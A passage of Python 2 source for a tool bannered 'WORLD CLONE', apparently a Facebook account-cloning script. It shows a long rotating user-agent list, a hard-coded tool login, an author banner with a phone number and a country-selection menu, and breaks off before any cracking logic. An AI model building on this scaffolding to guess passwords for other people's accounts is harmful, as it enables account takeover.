   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36', 
   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0', 
   'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36', 
   'Wget/1.17.1 (linux-gnu)', 
   'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36', 
   'Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 
   'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3', 
   'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36', 
   'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0', 
   'WirtschaftsWoche-iOS-1.1.14-20200824.1315', 
   '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko', 
   'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)', 
   'Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)', 
   'DoCoMo/2.0 P903i(c100;TB;W24H12)', 
   'DoCoMo/2.0 P903i', 
   'DoCoMo/2.0 SH10C(c500;TB;W16H12)', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)', 
   'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0', 
   'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)', 
   'com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960', 
   'Mogujie4Android/NAMhuawei/1290', 
   'Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1', 
   'Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0', 
   'Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0', 
   'Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1', 
   'Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1', 
   'Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15', 
   'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]', 
   'nokia-7.1-safari', 
   'NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB', 
   'Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]', 
   'Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]', 
   'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126', 
   'Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36', 
   'Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/', 
   'Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0', 
   'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254', 
   'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536', 
   'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058', 
   'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246', 
   'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9', 
   'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)', 
   'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV', 
   'Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)', 
   'Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)', 
   'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)', 
   'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)', 
   'Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)', 
   'Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)', 
   'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)', 
   'Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)', 
   'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV', 
   'Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)', 
   'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)', 
   'Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 
   'Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30', 
   'Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30', 
   'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 
   'WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)', 
   'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)', 
   'WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)', 
   'WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)', 
   'WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)', 
   'WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)', 
   'WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)', 
   'WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)', 
   'WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)', 
   'WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)', 
   'WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)', 
   'WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)', 
   'WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)', 
   'Dalvik/2.1.0 (Linux; U; Android 5.1)', 
   'Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)' 
   'Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)', 
   'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}', 
   'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2', 
   'Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)', 
   'Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)', 
   'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3', 
   'Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)', 
   'Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60', 
   'Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)', 
   'Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36', 
   'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0', 
                         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' 
                 ]) 
  
  
  
 def exb(): 
     print '[!] Exit Successfully' 
     os.sys.exit() 
  
  
 def exxb(): 
     print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;91;40m COM\x1b[1;91mING SO\x1b[1;91mON \x1b[1;91m\x1b[0;34;40m' 
     os.sys.exit() 
  
  
 def psb(z): 
     for e in z + '\n': 
         sys.stdout.write(e) 
         sys.stdout.flush() 
         time.sleep(0.03) 
  
  
 def jalan(z): 
     for e in z + '\n': 
         sys.stdout.write(e) 
         sys.stdout.flush() 
         time.sleep(3.0 / 200) 
  
  
 def tik(): 
     titik = [ 
      '   ', '.  ', '.. ', '...', '.. ', '.  ', '   '] 
     for o in titik: 
         print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;97mLoa\x1b[1;97mding \x1b[1;97m' + o, 
         sys.stdout.flush() 
         time.sleep(0.1) 
  
  
 def jaalan(z): 
     for e in z + '\n': 
         sys.stdout.write(e) 
         sys.stdout.flush() 
         time.sleep(2.0 / 9900) 
  
  
 def t(): 
     time.sleep(1) 
  
  
 def cb(): 
     os.system('clear') 
  
 os.system('clear')  
 logo = ("""                                                             
\033[93;1m  ____        _    _   _______ ______          __  __ 
\033[1;32m |  _ \      | |  | | |__   __|  ____|   /\   |  \/  |
\033[91;1m | |_) |_____| |__| |    | |  | |__     /  \  | \  / |
\033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
\033[94;1m | |_) |     | |  | |    | |  | |____ / ____ \| |  | |
\033[93;1m |____/      |_|  |_|    |_|  |______/_/    \_\_|  |_|
                                                                            
   \x1b[1;92m╔════════════════════════════════════════════╗
   \x1b[1;92m║➣TOOL NAME : 𝐖𝐎𝐑𝐋𝐃 𝐂𝐋𝐎𝐍𝐄                      ║
   \x1b[1;92m║➣AUTHOR    : 𝐁𝐃-𝐉𝐀𝐇𝐈𝐄𝐃                      ║
   \x1b[1;92m║➣GITHUB    : 𝐁𝐋𝐀𝐂𝐊-𝐇𝐔𝐍𝐓𝐄𝐑-𝐓𝐄𝐀𝐌              ║
   \x1b[1;92m║➣FACEBOOK  : 𝐁𝐝 𝐉𝐚𝐡𝐢𝐞𝐝                      ║
   \x1b[1;92m║➣Group     : 𝐁𝐋𝐀𝐂𝐊 𝐇𝐔𝐍𝐓𝐄𝐑 𝐓𝐄𝐀𝐌              ║
   \x1b[1;92m║➣WHATSAPP  : +8801747951169                 ║
   \x1b[1;92m╚════════════════════════════════════════════╝""")                         
 print logo 
 CorrectUsername = 'A' 
 CorrectPassword = 'A' 
 loop = 'true' 
 while loop == 'true': 
     username = raw_input('\x1b[1;91m\x1b[1;92m   Tool Username \x1b[1;92m:\x1b[1;91m') 
     if username == CorrectUsername: 
         password = raw_input('\x1b[1;91m \x1b[1;92m  Tool Password \x1b[1;92m:\x1b[1;91m') 
         if password == CorrectPassword: 
             print 
             psb ('\n\033[1;36m  Logged in successfully ') 
             time.sleep(2) 
             loop = 'false' 
         else: 
             print '\x1b[1;94mWrong Password' 
             os.system('xdg-open https') 
     else: 
         print '\x1b[1;94mWrong Username' 
         os.system('xdg-open https') 
  
 back = 0 
 back = 0 
 successful = [] 
 cpb = [] 
 oks = [] 
 id = [] 
 os.system('xdg-open https') 
  
 def menu(): 
     os.system('clear') 
     print logo 
     print 
     psb('\x1b[1;91m  [\x1b[1;92m01\x1b[1;91m]\x1b[1;92m BANGLADESH                       \x1b[1;91m[\x1b[1;92m02\x1b[1;91m]\x1b[1;92m AMERICA') 
     psb('\x1b[1;91m  [\x1b[1;92m03\x1b[1;91m]\x1b[1;92m UNITED KINGDOM                   \x1b[1;91m[\x1b[1;92m04\x1b[1;91m]\x1b[1;92m INDIA') 
     psb('\x1b[1;91m  [\x1b[1;92m05\x1b[1;91m]\x1b[1;92m BRAZIL                           \x1b[1;91m[\x1b[1;92m06\x1b[1;91m]\x1b[1;92m JAPAN') 
     psb('\x1b[1;91m  [\x1b[1;92m07\x1b[1;91m]\x1b[1;92m KOREA                            \x1b[1;91m[\x1b[1;92m08\x1b[1;91m]\x1b[1;92m ITALY') 
     psb('\x1b[1;91m  [\x1b[1;92m09\x1b[1;91m]\x1b[1;92m SPAIN                            \x1b[1;91m[\x1b[1;92m10\x1b[1;91m]\x1b[1;92m POLAND') 
     psb('\x1b[1;91m  [\x1b[1;92m11\x1b[1;91m]\x1b[1;92m PAKISTAN                         \x1b[1;91m[\x1b[1;92m12\x1b[1;91m]\x1b[1;92m INDONESIA') 
     psb('\x1b[1;91m  [\x1b[1;92m13\x1b[1;91m]\x1b[1;92m PERU                             \x1b[1;91m[\x1b[1;92m14\x1b[1;91m]\x1b[1;92m AUSTRALIA') 
     psb('\x1b[1;91m  [\x1b[1;92m15\x1b[1;91m]\x1b[1;92m CANADA                           \x1b[1;91m[\x1b[1;92m16\x1b[1;91m]\x1b[1;92m CHINA') 
     psb('\x1b[1;91m  [\x1b[1;92m17\x1b[1;91m]\x1b[1;92m DENMARK                          \x1b[1;91m[\x1b[1;92m18\x1b[1;91m]\x1b[1;92m FRANCE') 
     psb('\x1b[1;91m  [\x1b[1;92m19\x1b[1;91m]\x1b[1;92m GERMANY                          \x1b[1;91m[\x1b[1;92m20\x1b[1;91m]\x1b[1;92m MALAYSIA') 
     psb('\x1b[1;91m  [\x1b[1;92m21\x1b[1;91m]\x1b[1;92m SARI LANKA                       \x1b[1;91m[\x1b[1;92m22\x1b[1;91m]\x1b[1;92m TURKEY') 
     psb('\x1b[1;91m  [\x1b[1;92m23\x1b[1;91m]\x1b[1;92m U.A.E                            \x1b[1;91m[\x1b[1;92m24\x1b[1;91m]\x1b[1;92m SAUDIA ARABIA') 
     psb('\x1b[1;91m  [\x1b[1;92m25\x1b[1;91m]\x1b[1;92m ISRIL                 ') 
     psb('\n\x1b[1;91m  [\x1b[1;92m00\x1b[1;91m]\x1b[1;91m EXIT  ') 
     print 
     print ('\033[93;1m _______________________________________________________________________________ \33') 
     action() 
  
  
 def action(): 
     global cpb 
     global oks 
